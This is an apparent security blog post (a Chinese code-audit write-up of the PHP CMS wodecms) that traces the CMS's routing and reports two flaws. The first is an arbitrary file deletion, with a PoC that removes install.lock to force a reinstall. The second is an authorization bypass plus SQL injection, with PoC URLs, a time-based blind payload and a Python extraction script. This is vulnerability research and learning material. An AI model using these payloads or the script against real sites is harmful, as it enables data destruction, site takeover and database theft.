@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1a1a1a">
+  <meta name="description" content="">
+  <meta name="author" content="Doo-J">
+  <meta name="keywords" content="">
+  <title>代码审计之wodecms - Doo-J</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Doo-J</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 十一月 8日 2018, 10:04 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      6 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近找了款小众cms进行代码审计</p>
+<a id="more"></a>
+
+<h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>由于第一次审计代码，也是依照网上的一些经验来进行入手，同时也参考了《代码审计·企业级web代码安全架构》这一本书。我是先对代码的路由规则进行理清，在通过自动化工具进行扫描验证。</p>
+<p>cms入口文件分别是index.php和admin.php，分别是通过以下代码进行实例化运行的：<br>index.php：</p>
+<blockquote>
+<p>$control = new Controller();<br>$conrol-&gt;Run();  </p>
+</blockquote>
+<p>admin.php:  </p>
+<blockquote>
+<p>$conrol = new Controller();<br>$conrol-&gt;conrol = “admin”;<br>$conrol-&gt;Run();  </p>
+</blockquote>
+<p>相关的配置文件则是通过Init.php和setup.php进行调用：</p>
+<blockquote>
+<p>require ROOT_PATH.”/WODECMS/Init.php”<br>require(App_PATH.”setup.php”)</p>
+</blockquote>
+<p>跟进调用文件，发现Controller类于Init.php进行调用</p>
+<blockquote>
+<p>require ROOT_PATH.’/WODECMS/core/controller.class.php’</p>
+</blockquote>
+<p>进入controer.class.php文件,找到了入口函数Run()  </p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-30-10.png" alt=""></p>
+<p>这里又调用了Analysis()函数，继续跟进：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-32-29.png" alt=""></p>
+<p>这里可以看见，对$_GET[‘ac’]传入的数据进行了处理，并将值传给了$modelClass和$controlClass.</p>
+<p>继续跟进下半部分：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-36-39.png" alt=""></p>
+<p>这里c [‘URL_MODE’]是__construct()中的内容，旨在提供不同的模式。</p>
+<p>继续向下看，$_GET[‘ac’]参数控制的值先是传入$_GET[‘C’]和$_[‘a’]，再传入$ac[0]和$ac[1]</p>
+<p>最后对index和admin权限进行了一波判读按。</p>
+<p>然后回到Run()函数：</p>
+<p>$ac[0]和$ac[1]的值分别进入$this-&gt;control和$this-&gt;action.</p>
+<p>注意这里的一次包含：</p>
+<blockquote>
+<p>$controlFile = ROOT_PATH . ‘/‘ . APP_PATH . “/“ . GROUP_DIR . “/“ . $this-&gt;control . ‘.class.php’;<br>include ($controlFile);</p>
+</blockquote>
+<p>这是根据$this-&gt;control和GROUP_DIR决定引入文件，GROUP_DIR是根据入口文件是index.php和admin.php来决定的。我们查看这两个文件夹：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-33-14.png" alt=""></p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-33-26.png" alt=""></p>
+<p>发现里面存放的是相应的模块文件。</p>
+<p>继续下行，发现了最为核心的控制：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-35-36.png" alt=""></p>
+<p>分析代码，我们便可以得知，引入的方法模块通过<code>$instance-&gt;$mothodName()</code>来进行调用</p>
+<p>至此，大致的逻辑就出来了，整站分别通过index.php和admin.php为入口，通过GET参数ac对方法进行调用，其中a为模块文件，c为模块方法</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>漏洞点：</p>
+<blockquote>
+<p>/app/admin/kindeditor.class.php</p>
+<blockquote>
+<p>function delete()<br>/app/admin/picture.class.php<br>function delete()<br>/app/admin/download.class.php<br>function deletePic()<br>/app/controller/kindeditor.class.php<br>function delete()<br>/app/controller/picture.class.php<br>function deletePic()  </p>
+</blockquote>
+</blockquote>
+<p>这套cms的任意删除文件出发点有点多！！！</p>
+<p>我这里以<code>/app/controller/picture.class.php</code>为例：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-21-26.png" alt=""></p>
+<p><code>$path = ROOT_PATH.$_GET[&#39;pic&#39;]</code><br><code>unlink($path)</code></p>
+<p><strong>根本没有任何防备。。。。</strong></p>
+<p>这里ROOT_PATH的值为网站根目录地址<br>直接构造POC：<br><code>http://127.0.0.1/index.php?ac=picture_delete&amp;pic=/1.txt</code></p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-31-15.png" alt=""></p>
+<p>POC验证：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-32-19.png" alt=""></p>
+<p>回看文件夹：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-32-55.png" alt=""></p>
+<p>这里可以对任意文件删除，如可以尝试删除install.lock文件，对网站进行重装</p>
+<p>正常状况下：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-10-04.png" alt=""></p>
+<p>通过构造POC删除app/date/install.lock文件</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-12-16.png" alt=""></p>
+<p>再次访问，即可进行重装</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-12-54.png" alt=""></p>
+<h3 id="权限越过-amp-sql注入"><a href="#权限越过-amp-sql注入" class="headerlink" title="权限越过&amp;sql注入"></a>权限越过&amp;sql注入</h3><p>漏洞点位于文件<code>/app/controller/video.class.php</code>的loading()函数</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-43-36.png" alt=""></p>
+<p>在此处的sql语句 <code>&quot;UPDATE tc_user SET money =&quot;.$num.&quot; WHERE id = &quot;.$uid</code><br>对于$uid仅仅只有全局过滤而在此处没有任何过滤且此处为数字型注入<br>这意味着只要过了全局过滤，在此处可以随意注入</p>
+<p>首先，此sql语句操作的是tc_user表的money数据，emmmm，算是比较重要的敏感数据，根据查找，在<code>index.php?ac=user_home</code>里对此数据进行了调用：<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-41-01.png" alt=""></p>
+<p>这里的积分就是money数据，我们构造POC对积分尝试操作：<br><code>http://127.0.0.1/index.php?ac=video_loading&amp;money=111&amp;uid=2</code>(这里的uid为当前用户id)</p>
+<p>前台数据已被修改：</p>
+<p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-46-08.png" alt=""></p>
+<p>这里的money数据为敏感数据，前台用户通过调用模块方法进行修改，属于垂直越权。<br>继续深入：</p>
+<p>根据代码逻辑，这里的sql语句执行结果并未返回，但是在此处并没有回显<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-48-54.png" alt=""><br>但是代码的执行与否却会影响user_home的积分值，我们通过对比<code>user_home</code>界面，得出语句的正确与否.<br>这里我写了个小脚本：</p>
+<pre><code>#!/usr/bin/python3
+# *_* coding: utf-8 *_*
+
+import requests
+from bs4 import BeautifulSoup as bsf
+
+url_payload = &#39;http://127.0.0.1/index.php?ac=video_loading&amp;money=110&amp;uid=1 &#39;
+url_reset = &#39;http://127.0.0.1/index.php?ac=video_loading&amp;money=100&amp;uid=1&#39;
+urlcheck = &#39;http://127.0.0.1/index.php?ac=user_home&#39;
+length = 0
+flag = 100
+database = &#39;&#39;
+cookies = {&#39;PHPSESSID&#39;: &#39;qsmsrleeo6ro1j3ivlq1jv1g94&#39;} #PHPSESSID 值需要自己进行修改
+database_length = &#39;and 1=(length(datababasese())=&#39;+str(length)+&#39;)&#39;
+database_payload = &#39;and 1=(ascii(substr(database() from 1))=119)&#39;
+
+
+def sql_start(url):
+
+    try:
+        r = requests.get(url= url, cookies= cookies)
+        status = r.status_code
+    except Exception as e:
+        print(&#39;[*] connect error!&#39;)
+        print(e)
+
+def check(url):
+
+    try:
+        r = requests.get(url= url, cookies= cookies)
+        html = r.text
+        soup = bsf(html, &#39;lxml&#39;)
+        result = soup.find_all(&#39;div&#39;, class_=&#39;personal-information&#39;)
+        final = result[0].ul
+        if str(flag) not in str(final):
+            return 1
+        else:
+            return 0
+    except Exception as e:
+        print(&#39;[*] connect error!&#39;)
+        print(e)
+
+def restart(url):
+
+    try:
+        r = requests.get(url= url, cookies= cookies)
+    except Exception as e:
+        print(e)
+
+def database_len():
+
+    global length
+    restart(url_reset)
+    for i in range(1, 20):
+        url = url_payload+&#39;and 1=(length(datababasese())=&#39;+str(i)+&#39;)&#39;
+        print(&#39;[-] Testing: &#39;, url)
+        sql_start(url)
+        if check(urlcheck):
+            print(&quot;[+] The database&#39;s length is &quot;, i)
+            length = i
+            return 0
+        else:
+            print(&#39;[*] filed&#39;)
+#database_len()
+
+def database_sql():
+
+    global database
+    result = &#39;&#39;
+    for i in range(1, length+1):
+        restart(url_reset)
+        for j in range(1, 128):
+            url = url_payload+&#39;and 1=(ascii(substr(datababasese() from &#39;+str(i)+&#39;))=&#39;+str(j)+&#39;)&#39;
+            print(&#39;[-] Testing &#39;, url)
+            sql_start(url)
+            if check(urlcheck):
+                print(&#39;[+] succees !&#39;)
+                result = result+chr(j)
+                break
+            else:
+                print(&#39;[*] filed&#39;)
+        print(&#39;result is&#39;, result)
+    database = result
+database_len()
+database_sql()
+print(database)</code></pre><p>PS：此处只对数据库进行注入，未尝试更多，但原理一样，仅需更改payload即可.</p>
+<p>但有些时候，我们并不知道uid的值，那么此处通过<code>user_home</code>进行判断就不可取，那么就可以用时间盲注构造POC：<br><code>http://127.0.0.1/index.php?ac=video_loading&amp;money=111&amp;uid=2 and (0=(select case when (ascii(substring((database()) from 1 for 1 ))=119) then sleep(4) else 0 end))</code><br>(此处对参数全局过滤了逗号，且对database()中的base进行了一次替换)<br>我们查看POC验证情况：<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_15-11-30.png" alt=""><br>成功验证.</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个cms比较小众，也没有做较多的防御。而且当中有很多方法都是写出来但并没有对方法进行调用，所以就没有找到更危险的漏洞（也是我太菜的缘故）。但也算是大致知道代码审计的基本流程和方法，结果还算是好的。<br>再接再励！</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E8%AE%B0/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span class="hidden-mobile">反序列化的一些知识</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2018/09/16/%E8%A7%A3%E5%86%B3kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/">
+                        <span class="hidden-mobile">解决kali虚拟机网络问题</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><span style="color:white;"><i class="far fa-list-alt"></i>&nbsp;目录</span></p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "代码审计之wodecms&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
